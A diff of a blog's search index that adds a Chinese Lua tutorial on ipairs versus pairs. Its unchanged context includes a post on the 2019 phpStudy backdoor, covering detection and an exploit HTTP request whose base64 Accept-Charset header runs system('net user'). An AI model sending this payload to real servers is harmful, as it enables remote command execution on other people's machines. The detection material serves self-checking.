@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[lua中迭代器pairs和ipairs的比较]]></title>
+    <url>%2Fipairs-pairs-in-lua%2F</url>
+    <content type="text"><![CDATA[ipairs和pairs是lua标准库中提供的两种迭代器，通常用于数组和表中的元素遍历，关于两者的解释，可以参考lua语言参考手册，其中的具体解释如下 ipairs(t) 返回三个值（迭代函数、表 t 以及 0 ）， 如此，以下代码 for i,v in ipairs(t) do body end 将迭代键值对（1,t[1]) ，(2,t[2])， … ，直到第一个空值。 pairs(t) 如果 t 有元方法 __pairs， 以 t 为参数调用它，并返回其返回的前三个值。 否则，返回三个值：next 函数， 表 t，以及 nil。 因此以下代码 for k,v in pairs(t) do body end 能迭代表 t 中的所有键值对。 可以很明显的看到ipairs在进行迭代时，需要迭代键值对是连续的，也就是说ipairs在遇到值为nil的数据时会认为数组或表已经结束了，不管后面还存在多少数据都不会再进行迭代。 而pairs会完整的遍历整个数组或表，无论其值是否为nil。 举个几个例子来展示一下 12345678local tabFiles = &#123;[3] = "test2",[6] = "test3",[4] = "test1"&#125; for k, v in ipairs(tabFiles) doprint(k, v) 以上代码并不会输出数据，由此可见，使用ipairs迭代器时，当键值为1时，tabFiles[1]值为nil，导致迭代器终止，所以就算后面存在有非空数值也不会继续迭代。 12345678local tabFiles = &#123;[1] = "test2",[6] = "test3",[4] = "test1"&#125; for k, v in ipairs(tabFiles) doprint(k, v) 当我们为键值为1的元素赋值后，可以看到使用ipairs可以正常迭代，而后面的元素依旧不会被迭代。 123456789local tabFiles = &#123;[3] = "test2",[6] = "test3",[4] = "test1"&#125; for k, v in pairs(tabFiles) doprint(k, v)end pairs迭代器会遍历键值，如果存在数据则输出数据，不会因为空值而中断 对于pairs迭代器，有一个非常重要的点是他的迭代顺序并不是顺序的 1234567891011local tabFiles = &#123;[3] = "test2",[6] = "test3",[9] = "test1",[12] = "test6",[15] = "test4"&#125; for k, v in pairs(tabFiles) doprint(k, v)end 出现这个问题的原因主要还是对于lua中的表来说，是不存在顺序的。在lua语言中，表使用的是关联数组，他只存在键值和数值的对应关系，并不存在键值的排列顺序，所以在使用pairs迭代时，并不会按照键值顺序输出。解决这个问题的方法是重写pairs迭代器，让他按照键值顺序迭代输出。 123456789101112131415161718192021function pairsByKeys(t) local a = &#123;&#125; for n in pairs(t) do a[#a + 1] = n end table.sort(a) local i = 0 return function() i = i + 1 return a[i], t[a[i]] endendfor key, value in pairsByKeys(tbl) do print( key, value )end 首先正常遍历表，然后保存到另一个新的表中，通过table.sort方法对重新组合的表进行排序，之后就可以直接输出经过排序后的表。]]></content>
+      <categories>
+        <category>lua</category>
+      </categories>
+      <tags>
+        <tag>lua</tag>
+        <tag>迭代器</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[phpStudy后门测试]]></title>
     <url>%2Fphpstudy-backdoor%2F</url>
     <content type="text"><![CDATA[前言 后门检测 后门利用 一. 前言9月20公布的phpStudy官网被控，被黑客植入恶意后门的事件引起了极大的关注，影响极为广泛，本文简单写一下自查和利用。 二. 后门检测从发布的资料上主要出现在以下版本的php中 php5.4.45 php5.2.17 phpStudy版本主要是在20180211和20161103俩个版本，但据说其他版本也存在这种情况。 在phpStudy安装目录中查找php\php-5.4.45\ext目录下的php_xmlrpc.dll文件，记事本打开，查找关键词eval，可以看到如下内容即证明存在后门 三. 后门利用首先启动对应版本的php 访问主页并插入exp 123456789GET / HTTP/1.1Host: 192.168.242.131Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding:gzip,deflateAccept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==Accept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close Accept-Charset字段经过base64加密，原文中字段解码后为system(&quot;net user&quot;);，需要注意的是在直接构造该请求时，需要在Accept-Charset字段后添加两个换行，不然会出现不响应的情况。此外Accept-Encoding字段值必须为gzip,deflate，才能去判断是否存在Accept-Charset字段，读取该字段的值。 参考 phpStudy后门简要分析 phpStudy遭黑客入侵植入后门事件披露 | 微步在线报告 数十万PhpStudy用户被植入后门，快来检测你是否已沦为“肉鸡”！]]></content>
@@ -35,8 +47,8 @@
         <category>攻击测试</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>Metasploit</tag>
+        <tag>kali Linux</tag>
         <tag>攻击测试</tag>
         <tag>木马攻击</tag>
         <tag>UAC提权</tag>
@@ -153,8 +165,8 @@
         <category>攻击测试</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>Metasploit</tag>
+        <tag>kali Linux</tag>
         <tag>攻击测试</tag>
         <tag>Ettercap</tag>
         <tag>browser_autopwn2</tag>
